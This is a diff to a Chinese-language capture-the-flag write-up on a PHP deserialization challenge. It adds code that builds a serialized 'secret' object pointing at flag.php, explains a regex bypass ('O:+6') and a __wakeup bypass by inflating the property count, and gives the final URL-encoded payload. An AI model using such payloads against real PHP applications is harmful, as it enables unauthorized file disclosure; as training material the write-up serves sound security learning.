@@ -94,3 +94,27 @@ else{
 ### 解决
 1.file属性需要赋值flag.php
 2.利用wakeup漏洞进行绕过
+
+通过代码先生成需要的序列化字符串
+```php
+<?php
+class secret{
+    var $file='flag.php';
+}
+$a = new secret();
+echo serialize($a)."\n";
+//sercet in flag.php
+?>
+
+O:6:"secret":1:{s:4:"file";s:8:"flag.php";}
+```
+1.绕过正则匹配，在`O:6`插入`+`绕过`O:+6`不影响反序列化识别
+2.将成员属性的个数增加
+得到需要的版本，最后用url编码提交解码后识别+为空
+```php
+O:+6:"secret":666:{s:4:"file";s:8:"flag.php";}
+
+O%3A%2B6%3A%22secret%22%3A666%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
+```
+
+![](assets/wakeup绕过/file-20260131153315237.png)
